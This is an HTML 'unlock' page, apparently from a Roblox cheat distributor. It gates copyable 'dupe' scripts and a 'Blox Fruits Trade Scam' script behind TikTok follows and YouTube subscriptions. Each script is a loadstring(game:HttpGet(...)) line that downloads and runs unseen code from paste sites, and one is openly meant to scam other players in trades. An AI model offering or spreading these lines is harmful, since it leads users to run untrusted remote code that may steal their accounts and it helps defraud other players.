<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Unlock Dupe</title>

<style>
body{
  margin:0;
  min-height:100vh;
  background:linear-gradient(180deg,#0b1220,#050814);
  font-family:Arial,sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
}
.card{
  width:90%;
  max-width:400px;
  background:#111a2e;
  border-radius:16px;
  padding:22px;
  box-shadow:0 20px 40px rgba(0,0,0,.6);
}
.title{
  text-align:center;
  font-size:24px;
  font-weight:bold;
  color:#4fd1ff;
}
.subtitle{
  text-align:center;
  font-size:14px;
  opacity:.85;
  margin:8px 0 18px;
}
.task{
  width:100%;
  border:none;
  padding:14px;
  margin:7px 0;
  border-radius:10px;
  font-size:15px;
  font-weight:bold;
  cursor:pointer;
  color:#fff;
}
.tiktok{background:#3b82f6}
.youtube{background:#f59e0b}
.like{background:#22c55e}
.comment{background:#ec4899}
.watch{background:#ef4444}
.toggle{background:#6366f1}
.dev-btn{background:#0ea5e9}

.progress{
  background:#1e293b;
  border-radius:10px;
  height:12px;
  margin-top:16px;
  overflow:hidden;
}
.bar{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,#4fd1ff,#38bdf8);
}
.percent{
  text-align:center;
  font-size:13px;
  margin-top:6px;
}

.script-box{
  background:#0b1220;
  border-radius:12px;
  padding:12px;
  margin-top:12px;
}
.script-title{
  font-weight:bold;
  margin-bottom:6px;
}
textarea{
  width:100%;
  height:70px;
  background:#020617;
  color:#38bdf8;
  border:none;
  border-radius:8px;
  padding:8px;
  resize:none;
  font-family:monospace;
  font-size:12px;
}
.copy{
  width:100%;
  border:none;
  padding:10px;
  border-radius:8px;
  background:#4fd1ff;
  color:#000;
  font-weight:bold;
  cursor:pointer;
  margin-top:6px;
}

.dev-panel{
  display:none;
  margin-top:14px;
}
.dev-header{
  display:flex;
  justify-content:space-between;
  align-items:center;
}
.dev-close{
  cursor:pointer;
  font-size:18px;
  color:#f87171;
}

.update{
  text-align:center;
  font-size:12px;
  color:#888;
  margin-top:16px;
}
</style>
</head>

<body>

<div class="card">
  <div class="title" id="title">🔑 Steal A Brainrot Dupe</div>
  <div class="subtitle">Complete all steps to unlock</div>

  <button class="task tiktok" onclick="step(this,tiktok)">📌 Follow TikTok</button>
  <button class="task youtube" onclick="step(this,yt)">🔔 Subscribe</button>
  <button class="task like" onclick="step(this,yt)">👍 Like</button>
  <button class="task comment" onclick="step(this,yt)">💬 Comment</button>
  <button class="task watch" onclick="step(this,yt)">▶️ Watch</button>

  <div class="progress"><div class="bar" id="bar"></div></div>
  <div class="percent" id="percent">0%</div>

  <button class="task toggle" onclick="togglePage()" id="toggleBtn">
    Blox Fruits Trade Scam
  </button>

  <div id="scripts"></div>

  <!-- DEV PANEL -->
  <div class="dev-panel" id="devPanel">
    <div class="dev-header">
      <b>Dev Scripts</b>
      <span class="dev-close" onclick="closeDev()">✕</span>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 1</div>
      <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
      <button class="copy" onclick="copyConfirm(this)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 2</div>
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
      <button class="copy" onclick="copyConfirm(this)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 3</div>
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
      <button class="copy" onclick="copyConfirm(this)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Blox Fruits Trade Scam</div>
      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/cjJB2AJyX7q97G5k/raw", true))()</textarea>
      <button class="copy" onclick="copyConfirm(this)">Copy</button>
    </div>
  </div>

  <!-- DEV BUTTON MOVED TO BOTTOM -->
  <button class="task dev-btn" onclick="openDev()">Show All Scripts (Dev)</button>

  <div class="update">Last updated: 2026-01-05</div>
</div>

<script>
let done=0,total=5,trade=false;
const bar=document.getElementById("bar");
const percent=document.getElementById("percent");
const scripts=document.getElementById("scripts");
const title=document.getElementById("title");
const toggleBtn=document.getElementById("toggleBtn");
const devPanel=document.getElementById("devPanel");

const tiktok="https://www.tiktok.com/@void_scriptz";
let yt="https://youtu.be/Oc9vLLmABqs";

function step(b,l){
  if(b.dataset.d)return;
  b.dataset.d=1;
  b.style.opacity=.6;
  done++;
  bar.style.width=(done/total*100)+"%";
  percent.innerText=Math.floor(done/total*100)+"%";
  if(done===total)showScripts();
  window.open(l,"_blank");
}

function showScripts(){
  scripts.innerHTML=trade
  ? `<div class="script-box">
      <div class="script-title">Blox Fruits Trade Scam</div>
      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/cjJB2AJyX7q97G5k/raw", true))()</textarea>
      <button class="copy" onclick="copyConfirm(this)">Copy</button>
     </div>`
  : `
    <div class="script-box"><div class="script-title">Dupe Script 1</div><textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea><button class="copy" onclick="copyConfirm(this)">Copy</button></div>
    <div class="script-box"><div class="script-title">Dupe Script 2</div><textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea><button class="copy" onclick="copyConfirm(this)">Copy</button></div>
    <div class="script-box"><div class="script-title">Dupe Script 3</div><textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea><button class="copy" onclick="copyConfirm(this)">Copy</button></div>`;
}

function togglePage(){
  trade=!trade;
  done=0;
  bar.style.width="0%";
  percent.innerText="0%";
  scripts.innerHTML="";
  document.querySelectorAll(".task").forEach(b=>{delete b.dataset.d;b.style.opacity=1});
  title.innerText=trade?"🔑 Blox Fruits Trade Scam":"🔑 Steal A Brainrot Dupe";
  toggleBtn.innerText=trade?"⬅ Go Back":"Blox Fruits Trade Scam";
  yt=trade?"https://youtube.com/shorts/ycfxxkTQmTU":"https://youtu.be/Oc9vLLmABqs";
}

function openDev(){
  if(prompt("Enter Dev Code")==="NinjaBlender223")devPanel.style.display="block";
}
function closeDev(){devPanel.style.display="none"}

function copyConfirm(btn){
  if(confirm("Use The Script In Second Sea Cafe Or It Won't Work")){
    navigator.clipboard.writeText(btn.previousElementSibling.value);
    alert("Copied!");
  }
}
</script>

</body>
</html>
